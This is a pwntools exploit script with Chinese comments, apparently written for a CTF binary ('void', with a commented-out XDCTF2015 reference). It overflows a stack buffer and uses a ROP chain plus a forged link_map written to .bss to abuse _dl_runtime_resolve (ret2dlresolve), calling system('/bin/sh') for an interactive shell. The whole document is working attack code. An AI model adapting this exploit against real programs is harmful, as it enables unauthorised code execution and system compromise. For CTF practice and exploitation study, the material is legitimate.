from pwn import * 
context(os='linux',arch='amd64',log_level='debug')
 
#r = gdb.debug("./parelro_x64",'break main')
gdbscript='''
init-pwndbg
b *0x401026
'''.format(**locals())
r = gdb.debug('./void', gdbscript=gdbscript)
elf = ELF('./void') 
libc = ELF('./glibc/libc.so.6') 
read_plt = elf.plt['read'] 
read_got = elf.got['read'] 
vuln_addr = elf.sym['vuln'] 
 
#bss 
bss = elf.get_section_by_name('.bss').header.sh_addr - 0x8
bss_stage = bss + 0x100
l_addr =  libc.sym['system'] - libc.sym['read']  # l_addr = -769472, 通常为负数
 
pop_rdi = ROP(elf).find_gadget(['pop rdi'])[0]
#pop rsi ; pop r15 ; ret 
pop_rsi = ROP(elf).find_gadget(['pop rsi'])[0]
#用于解析符号dl_runtime_resolve 
plt_load = 0x401020
 
def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):
    # &(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误
    linkmap = p64(offset & (2 ** 64 - 1))#l_addr
 
    # fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容
    linkmap += p64(0) # 可以为任意值
    linkmap += p64(fake_linkmap_addr + 0x18) # 这里的值就是伪造的.rel.plt的地址
 
    # fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项
    linkmap += p64((fake_linkmap_addr + 0x30 - offset) & (2 ** 64 - 1)) # Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可
    linkmap += p64(0x7) # Rela->r_info,用于索引symtab上的对应项，7>>32=0，也就是指向symtab的第一项
    linkmap += p64(0)# Rela->r_addend,任意值都行
 
    linkmap += p64(0)#l_ns
 
    # fake_linkmap_addr + 0x38, DT_SYMTAB
    linkmap += p64(0) # 参考IDA上.dyamisc的结构
    linkmap += p64(known_func_ptr - 0x8) # 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8
 
    linkmap += b'/bin/sh\x00'
    linkmap = linkmap.ljust(0x68,b'A')
    linkmap += p64(fake_linkmap_addr) # fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域
    linkmap += p64(fake_linkmap_addr + 0x38) # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址
    linkmap = linkmap.ljust(0xf8,b'A')
    linkmap += p64(fake_linkmap_addr + 0x8) # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址
    return linkmap
 
fake_link_map = fake_Linkmap_payload(bss_stage, read_got ,l_addr)# 伪造link_map
 
payload = flat( 'a' * 72 ,pop_rdi, 0 , pop_rsi , bss_stage , 0 , read_plt , # 把link_map写到bss段上
                pop_rsi , 0 ,0 , # 使栈十六字节对齐，不然调用不了system
                pop_rdi , bss_stage + 0x48  , plt_load , bss_stage , 0 # 把/bin/sh传进rdi，并且调用_dl_rutnime_resolve函数，传入伪造好的link_map和索引
)
 
# r.recvuntil('Welcome to XDCTF2015~!\n')
# gdb.attach(r) 
r.sendline(payload) 
 
r.send(fake_link_map)
 
r.interactive()